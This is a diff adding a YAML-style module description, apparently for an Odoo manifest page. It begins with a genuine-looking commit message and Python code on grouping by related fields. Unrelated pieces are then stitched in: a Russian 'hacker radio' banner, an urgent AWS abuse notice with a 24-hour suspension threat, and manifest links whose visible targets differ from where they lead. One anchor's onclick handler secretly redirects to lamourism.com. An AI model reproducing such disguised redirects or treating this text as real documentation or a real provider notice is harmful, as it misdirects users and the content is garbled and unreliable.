@@ -1,0 +1,181 @@
+- key: name
+  value: |
+    [IMP] core: read_group: allow grouping by non-stored related fields
+    <br/>
+    <br/>Here we are jumping between fields to make joins and finally reach the table where field is stored, so we can read it.
+    <br/>
+    <br/>There are two types of virtual fields (virtual in a sense, that they are stored not in a current table, but in another one):
+    <br/>
+    <br/>1. inherited fields or implicit related fields
+    <br/>2. explicit related fields
+    <br/>
+    <br/>Any inherited field could be represented as an explicit related field. For example, inherited field "name" in res.users is equivalent to following explicit definition:
+    <br/>
+    <br/>name = fields.Char(related='partner_id.name')
+    <br/>
+    <br/>Things become more complicated when we have related fields inside related fields (have you seen Inception 2010 movie?). Let's see following example:
+    <br/>
+    <br/>class Partner(models.Model)
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;_name = 'res.partner'
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp; parent_id = fields.Many2one('res.partner', string='Related Company', index=True)
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp; parent_name = fields.Char(related='parent_id.name', readonly=True, string='Parent name')
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp; # ...
+    <br/>
+    <br/>class User(models.Model)
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;_name = 'res.users'
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;_inherits = {'res.partner': 'partner_id'}
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp; partner_id = fields.Many2one('res.partner')
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp; # ...
+    <br/>
+    <br/>class Guru(models.Model)
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;_name = 'res.guru'
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;_inherits = {'res.users': 'user_id'}
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;user_id = fields.Many2one('res.users')
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;# ...
+    <br/>
+    <br/>class Task(models.Model)
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;_inherit = 'project.task'
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;guru_id = fields.Many2one('res.guru')
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;guru_parent_name = fields.Char(related='guru_id.partner_id.parent_name')
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;# ...
+    <br/>
+    <br/>To read guru_parent_name we do for-loop over ['guru_id', 'partner_id', 'parent_name'] and expand field if it's related:
+    <br/>
+    <br/>['guru_id', 'partner_id', 'parent_name']
+    <br/>['guru_id', ['user_id', 'partner_id'], 'parent_name']
+    <br/>['guru_id', ['user_id', 'partner_id'], ['parent_id', 'name']]
+    <br/>
+    <br/>Because any field in the expanded chain may be related field, we should do this process recursively. This is how function "process" works.
+    <br/>
+    <br/>For more examples of possible variants of related fields check tests defined in
+    <br/>./addons/test_read_group/tests/test_related.py
+    <br/>
+    <br/>
+    <br/><span class="hljs-keyword">def</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">model, alias, field, sudo</span>):
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> field.related <span class="hljs-keyword">or</span> field.store:
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span> model, alias, field, sudo
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;sudo = sudo <span class="hljs-keyword">or</span> field.compute_sudo
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;last_field = field.related_field
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">for</span> join_fname <span class="hljs-keyword">in</span> field.related.split(<span class="hljs-string">'.'</span>)[:-<span class="hljs-number">1</span>]:
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;field = model._fields[join_fname]
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;model, alias, field, sudo = process(model, alias, field, sudo)
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">assert</span> field.<span class="hljs-built_in">type</span> == <span class="hljs-string">'many2one'</span>, <span class="hljs-string">"Related field must be a chain of stored or related many2one fields"</span>
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;model = self.env[field.comodel_name]
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span> field.auto_join:
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sudo = <span class="hljs-literal">True</span>
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (sudo <span class="hljs-keyword">or</span> model.check_access_rights(<span class="hljs-string">'read'</span>, raise_exception=<span class="hljs-literal">False</span>)):
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">raise</span> AccessError(_(<span class="hljs-string">"Field %s has %s and can't be used without read access"</span>) % (
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;field, <span class="hljs-string">'auto_join=False'</span>
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;))
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alias = query.left_join(
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;alias, join_fname,
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;model._table, <span class="hljs-string">'id'</span>,
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;join_fname
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;)
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;model, field = self.env[last_field.model_name], last_field
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment"># Last field may be related too (like guru_parent_name in example above)</span>
+    <br/>&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span> process(model, alias, field, sudo)
+    <br/>
+    <br/>model, alias, field, _sudo = process(model, alias, field, self.env.su)
+    <br/>
+    <br/>fname = field.name
+    <br/>
+    <br/>
+    <br/><span class="red">x x x x x x x x x x x x ВНИМАНИЕ! x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x x ГОВОРИТ РАДИО СВОБОДА x x x x x x x x у микрофона хакер матрицы Иван Николаевич КРОПОТКИН x x x x x x x МЫ НАЧИНАЕМ x x x x x x x x x x x x x x x</span>
+    <br/>
+    <br/>URGENT: RESPONSE REQUIRED WITHIN 24 HOURS or your resources may be suspended
+    <br/>
+    <br/>Hello,
+    <br/>
+    <br/>As we have informed you earlier, we have received an abuse report that your Amazon Web Services (AWS) resources have been posting, distributing, or hosting material containing Personal Identifiable Information (PII) regarding several people who have not given consent. Making this information publicly available is a violation of the AWS Acceptable Use Policy (AUP) (https://aws.amazon.com/aup/ ):
+    <br/>
+    <br/>You may not use, or facilitate or allow others to use, the Services or the AWS Site:
+    <br/>
+    <br/>for any illegal or fraudulent activity;
+    <br/>to violate the rights of others;
+    <br/>
+    <br/>and the AWS Customer Agreement (https://aws.amazon.com/agreement/ ):
+    <br/>
+    <br/>2.2 Your Content. You are responsible for Your Content. You will ensure that Your Content and your and End Users’ use of Your Content or the Services will not violate any of the Policies or any applicable law.
+    <br/>
+    <br/>Please remove the allegedly infringing content, or provide us with detailed information describing why you have permission to post it, within 24 hours of receiving this notice. If you do not remove the content, we will take the necessary steps to disable access to the content, up to and including suspension of your account.
+    <br/>
+    <br/>A copy of the complaint identifying the allegedly infringing content is below.
+    <br/>
+    <br/>Please review the attached notice and take appropriate action.
+    <br/>
+    <br/>Regards,
+    <br/>
+    <br/>Case Number: 123456789-0
+    <br/>
+    <br/>---Beginning of forwarded report---
+    <br/>
+    <br/>* Log Extract:
+    <br/><<<
+    <br/>https://odoomagic[.]com/index[.]html
+    <br/>https://odoomagic[.]com/
+    <br/>>>>
+    <br/>
+    <br/>* Comments:
+    <br/><<<
+    <br/>This image depicts a police report containing Identifiable Personal Information regarding several people who have not given consent, and represents very sensitive information.
+    <br/>
+    <br/>https://moses[.]lamourism[.]com/mossad/love-station[.]jpg
+    <br/>https://moses[.]lamourism[.]com/mossad/habib69[.]jpg
+    <br/>>>> How can I contact a member of the AWS abuse team or the reporter?
+    <br/>Reply to this email with the original subject line.
+    <br/>
+    <br/>Amazon Web Services
+    <br/>
+    <br/>Amazon Web Services LLC is a subsidiary of Amazon.com, Inc. Amazon.com is a registered trademark of Amazon.com, Inc. This message produced and distributed by Amazon Web Services, LLC, 410 Terry Avenue North, Seattle, WA 98109-5210. 
+    <br/>
+
+  newline: true
+  typed: true
+
+- key: summary
+  summary: true
+  newline: true
+
+- key: description
+  content: true
+
+- key: author
+  value: Ivan Kropotkin
+- key: website
+  value: https://thepiratecircus.com/
+  url: Petrograd.html
+- comment: >
+    # Categories can be used to filter modules in modules listing
+    <br/># Check <a class="nomagic" href="https://lamourism.com/?debug=thepiratecircus.com/?debug=assets">aliyah.odooism.com</a> for the full list
+
+  key: category
+  value: Ragnarøkkr
+
+- key: version
+  value: 17.0
+  newline: true
+
+
+- comment: '# any module necessary for this one to work correctly'
+  key: depends
+  value: |
+    ['<a class="nomagic" title="Are you paying attention?" href="https://yelizariev.github.io/odoo/development/2015/04/17/source-diving.html" onclick="window.location.href='https://lamourism.com/?debug=https://yelizariev.github.io/odoo/development/2015/04/17/source-diving.html'; return false;"">web_debranding</a>']
+  newline: true
+
+- comment: '# always loaded'
+  key: data
+  value:
+    - value: 'security/security.csv'
+      className: nomagic
+      url: https://sorokin.lenta.ru/
+    - value: 'views/views.xml'
+      className: nomagic
+      url: https://lamourism.com/?debug=www.youtube.com/watch?v=dTNg5Tt09TE&t=36s&feature=aliyah.odooism.com
+    - value: 'views/templates.xml'
+      className: nomagic
+      url: https://lamourism.com/?debug=perestroika-2.com/
